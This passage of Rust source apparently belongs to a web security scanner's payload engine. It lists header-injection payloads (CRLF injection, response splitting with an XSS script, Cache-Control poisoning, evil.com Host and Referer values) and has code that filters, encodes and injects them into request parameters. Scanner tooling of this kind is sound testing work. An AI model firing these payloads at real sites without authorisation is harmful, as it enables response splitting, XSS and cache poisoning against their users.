                id: "header_crlf_2".to_string(),
                category: InjectionCategory::HeaderInjection,
                raw: "%0d%0aX-Injected: test".to_string(),
                description: "URL-encoded CRLF injection".to_string(),
                tags: vec!["crlf".to_string(), "url-encoded".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            Payload {
                id: "header_crlf_3".to_string(),
                category: InjectionCategory::HeaderInjection,
                raw: "\r\n\r\n<script>alert(1)</script>".to_string(),
                description: "CRLF injection for response splitting with XSS".to_string(),
                tags: vec!["crlf".to_string(), "response-splitting".to_string(), "xss".to_string()],
                risk_level: 6,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            // Cache poisoning
            Payload {
                id: "header_cache_1".to_string(),
                category: InjectionCategory::HeaderInjection,
                raw: "\r\nCache-Control: public, max-age=31536000".to_string(),
                description: "Cache poisoning via Cache-Control header injection".to_string(),
                tags: vec!["cache-poisoning".to_string(), "cache-control".to_string()],
                risk_level: 6,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            // Host header injection
            Payload {
                id: "header_host_1".to_string(),
                category: InjectionCategory::HeaderInjection,
                raw: "evil.com".to_string(),
                description: "Host header injection for cache poisoning".to_string(),
                tags: vec!["host-header".to_string(), "cache-poisoning".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            // X-Forwarded-For injection
            Payload {
                id: "header_xff_1".to_string(),
                category: InjectionCategory::HeaderInjection,
                raw: "127.0.0.1\r\nX-Injected: test".to_string(),
                description: "X-Forwarded-For header injection with CRLF".to_string(),
                tags: vec!["x-forwarded-for".to_string(), "crlf".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            // Referer injection
            Payload {
                id: "header_referer_1".to_string(),
                category: InjectionCategory::HeaderInjection,
                raw: "http://evil.com\r\nX-Injected: test".to_string(),
                description: "Referer header injection with CRLF".to_string(),
                tags: vec!["referer".to_string(), "crlf".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
        ]
    }
}

impl PayloadEngine for BuiltinPayloadEngine {
    fn get_payloads(&self, category: InjectionCategory, context: &PayloadContext) -> Vec<Payload> {
        let all_payloads = self.payloads.get(&category).cloned().unwrap_or_default();
        
        // Filter by safety
        let safe_payloads: Vec<Payload> = all_payloads.into_iter()
            .filter(|p| {
                // Check safety
                if !p.is_safe && self.safety.blocked_patterns.iter().any(|bp| p.raw.contains(bp)) {
                    return false;
                }
                
                // Check context requirements
                for req in &p.required_context {
                    let matches = match req.as_str() {
                        "mysql" => context.database_type.as_ref().map_or(false, |d| d.to_lowercase().contains("mysql")),
                        "postgresql" => context.database_type.as_ref().map_or(false, |d| d.to_lowercase().contains("postgres")),
                        "sqlserver" => context.database_type.as_ref().map_or(false, |d| d.to_lowercase().contains("sqlserver")),
                        "mongodb" => context.technology_hints.iter().any(|t| t.to_lowercase().contains("mongodb")),
                        "jinja2" => context.template_engine.as_ref().map_or(false, |t| t.to_lowercase().contains("jinja")),
                        "twig" => context.template_engine.as_ref().map_or(false, |t| t.to_lowercase().contains("twig")),
                        "freemarker" => context.template_engine.as_ref().map_or(false, |t| t.to_lowercase().contains("freemarker")),
                        "velocity" => context.template_engine.as_ref().map_or(false, |t| t.to_lowercase().contains("velocity")),
                        "linux" => context.os_type.as_ref().map_or(false, |o| o.to_lowercase().contains("linux")),
                        "windows" => context.os_type.as_ref().map_or(false, |o| o.to_lowercase().contains("windows")),
                        "aws" => context.technology_hints.iter().any(|t| t.to_lowercase().contains("aws")),
                        "ldap" => context.technology_hints.iter().any(|t| t.to_lowercase().contains("ldap")),
                        "xpath" => context.technology_hints.iter().any(|t| t.to_lowercase().contains("xpath")),
                        _ => true,
                    };
                    if !matches {
                        return false;
                    }
                }
                true
            })
            .collect();
        
        // Limit payloads per parameter
        safe_payloads.into_iter().take(self.safety.max_payloads_per_param).collect()
    }
    
    fn get_all_payloads(&self, category: InjectionCategory) -> Vec<Payload> {
        self.payloads.get(&category).cloned().unwrap_or_default()
    }
    
    fn mutate_parameter(&self, original: &str, payloads: &[Payload], location: ParameterLocation) -> Vec<String> {
        let mut mutated = Vec::new();
        
        for payload in payloads {
            for encoding in &payload.compatible_encodings {
                let encoded = self.encode_payload(&payload.raw, *encoding);
                
                match location {
                    ParameterLocation::Query | ParameterLocation::Body | ParameterLocation::JsonBody | ParameterLocation::XmlBody => {
                        // Replace or append
                        mutated.push(encoded.clone());
                        if !original.is_empty() {
                            mutated.push(format!("{}{}", original, encoded));
                        }
                    }
                    ParameterLocation::Header | ParameterLocation::Cookie => {
                        mutated.push(encoded.clone());
                    }
                    ParameterLocation::Path => {
                        mutated.push(encoded.clone());
                    }
                    ParameterLocation::MultipartForm => {
                        mutated.push(encoded.clone());
                    }
                }
            }
        }
        
        mutated
    }
    
    fn encode_payload(&self, payload: &str, encoding: Encoding) -> String {
        match encoding {
            Encoding::None => payload.to_string(),
            Encoding::Url => urlencoding::encode(payload).to_string(),
            Encoding::DoubleUrl => urlencoding::encode(&urlencoding::encode(payload).to_string()).to_string(),
            Encoding::HtmlEntity => {
                payload.chars()
                    .map(|c| match c {
                        '<' => "&lt;".to_string(),
                        '>' => "&gt;".to_string(),
                        '&' => "&amp;".to_string(),
                        '"' => "&quot;".to_string(),
                        '\'' => "&#x27;".to_string(),
                        _ => c.to_string(),
                    })
                    .collect()
            }
            Encoding::Unicode => {
                payload.chars()
                    .map(|c| format!("\\u{:04x}", c as u32))
                    .collect()
            }
            Encoding::Base64 => base64::encode(payload),
            Encoding::Hex => {
                payload.as_bytes()
                    .iter()
                    .map(|b| format!("{:02x}", b))
                    .collect()
            }
            Encoding::SqlComment => format!("{}--", payload),
            Encoding::Xml => {
                payload.chars()
                    .map(|c| match c {
                        '<' => "&lt;".to_string(),
                        '>' => "&gt;".to_string(),
                        '&' => "&amp;".to_string(),
                        '"' => "&quot;".to_string(),
                        '\'' => "&apos;".to_string(),
                        _ => c.to_string(),
                    })
                    .collect()
            }
            Encoding::Json => {
                serde_json::to_string(payload).unwrap_or_else(|_| payload.to_string())
            }
            Encoding::Custom => payload.to_string(),
        }
    }
    
    fn supported_encodings(&self) -> Vec<Encoding> {
        vec![
            Encoding::None,
            Encoding::Url,
            Encoding::DoubleUrl,
            Encoding::HtmlEntity,
            Encoding::Unicode,
            Encoding::Base64,
            Encoding::Hex,
            Encoding::SqlComment,
            Encoding::Xml,
            Encoding::Json,
        ]
    }
}

/// Factory for creating payload engines
pub fn create_payload_engine(safety: SafetyConfig) -> Box<dyn PayloadEngine> {
    Box::new(BuiltinPayloadEngine::new(safety))
}